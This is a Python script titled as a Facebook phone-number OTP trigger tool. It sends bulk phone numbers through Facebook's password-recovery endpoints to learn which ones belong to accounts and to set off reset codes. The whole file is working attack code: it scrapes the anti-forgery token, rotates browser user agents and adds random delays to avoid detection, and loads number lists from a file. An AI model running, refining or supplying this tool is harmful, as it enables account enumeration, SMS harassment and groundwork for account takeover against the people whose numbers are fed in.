#!/usr/bin/env python3
"""
Facebook Phone Number OTP Trigger Tool v5.0
Pure requests-based. Works in Termux.
"""

import requests
import re
import time
import sys
import random

BANNER = """
FB Password Reset OTP Trigger v5.0
Pure Requests - No Selenium
"""

session = requests.Session()

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
]


def extract_lsd_token(html_content):
    """Extract lsd token from Facebook page HTML using multiple methods."""
    patterns = [
        r'"token":"([a-zA-Z0-9_-]+)"',
        r'name="lsd"[^>]*value="([^"]+)"',
        r'"LSD",\[\],{"token":"([^"]+)"',
    ]
    for pattern in patterns:
        match = re.search(pattern, html_content)
        if match:
            return match.group(1)
    return None


def normalize_phone(phone):
    """Accept any format - just strip whitespace and dashes."""
    phone = phone.strip().replace(" ", "").replace("-", "").replace("(", "").replace(")", "")
    if not phone:
        return None
    return phone


def check_and_trigger_otp(phone):
    """Main function: extract token, send identify request, trigger OTP."""
    phone = normalize_phone(phone)
    if not phone:
        return {"status": "error", "message": "invalid_phone"}

    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Cache-Control": "max-age=0",
    }

    try:
        # STEP 1: Get the identify page and extract token
        identify_url = "https://www.facebook.com/login/identify?ctx=recover&lwv=110"
        resp = session.get(identify_url, headers=headers, timeout=15)

        lsd_token = extract_lsd_token(resp.text)
        if not lsd_token:
            return {"status": "error", "message": "TOKEN_ERROR - Could not extract lsd token", "phone": phone}

        # STEP 2: POST to identify.php endpoint
        identify_headers = {
            "User-Agent": headers["User-Agent"],
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://www.facebook.com",
            "Referer": identify_url,
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
        }

        data = {
            "lsd": lsd_token,
            "email": phone,
            "did_submit": "Search",
            "__user": "0",
            "__a": "1",
        }

        resp2 = session.post(
            "https://www.facebook.com/ajax/login/help/identify.php?ctx=recover",
            data=data,
            headers=identify_headers,
            timeout=15,
        )

        resp_text = resp2.text

        if "not found" in resp_text.lower() or "doesn" in resp_text.lower():
            return {"status": "not_found", "message": "Account not found on Facebook", "phone": phone}

        ldata_match = re.search(r'ldata=([a-zA-Z0-9-_]+)', resp_text)
        if ldata_match:
            ldata = ldata_match.group(1)
            recover_url = f"https://www.facebook.com/recover/initiate?ldata={ldata}"
            resp3 = session.get(recover_url, headers=headers, timeout=15)
            if "recover" in resp3.text.lower() or "send" in resp3.text.lower():
                return {"status": "found", "message": "OTP trigger initiated - Recovery page loaded", "phone": phone}
            return {"status": "found", "message": "Account found (ldata received)", "phone": phone}

        return {"status": "found", "message": "Account may exist - no ldata in response", "phone": phone}

    except requests.exceptions.Timeout:
        return {"status": "error", "message": "Request timeout - Facebook may be blocking", "phone": phone}
    except Exception as e:
        return {"status": "error", "message": f"Exception: {str(e)}", "phone": phone}


def main():
    print(BANNER)

    phones = []

    if len(sys.argv) > 1:
        if sys.argv[1] == "-f" and len(sys.argv) > 2:
            try:
                with open(sys.argv[2], "r") as f:
                    phones = [line.strip() for line in f if line.strip()]
                print(f"[+] Loaded {len(phones)} numbers from {sys.argv[2]}")
            except FileNotFoundError:
                print(f"[-] File not found: {sys.argv[2]}")
                return
        else:
            phones = [sys.argv[1]]
    else:
        print("[?] Enter phone number(s) (comma separated, empty line to finish):")
        while True:
            line = input("> ").strip()
            if not line:
                break
            for p in line.split(","):
                p = p.strip()
                if p:
                    phones.append(p)

    if not phones:
        print("[-] No phone numbers provided.")
        return

    print(f"[+] Total numbers to check: {len(phones)}")
    print("[+] Starting OTP trigger...\n")

    results = {"found": 0, "not_found": 0, "error": 0}
    start_time = time.time()

    for i, phone in enumerate(phones, 1):
        print(f"[{i}/{len(phones)}] Checking: {phone}", end=" ", flush=True)

        result = check_and_trigger_otp(phone)

        if result["status"] == "found":
            results["found"] += 1
            print(f"FOUND - OTP triggered!")
        elif result["status"] == "not_found":
            results["not_found"] += 1
            print(f"Not found")
        else:
            results["error"] += 1
            print(f"Error: {result['message']}")

        if i < len(phones):
            time.sleep(random.uniform(2.0, 3.5))

    total_time = time.time() - start_time
    speed = len(phones) / total_time if total_time > 0 else 0

    print(f"\n{'='*50}")
    print(f"Results: {results['found']} found, {results['not_found']} not found, {results['error']} errors")
    print(f"Time: {total_time:.1f}s | Speed: {speed:.1f}/s")
    print(f"[+] Numbers that triggered OTP will send SMS to their registered phones")


if __name__ == "__main__":
    main()
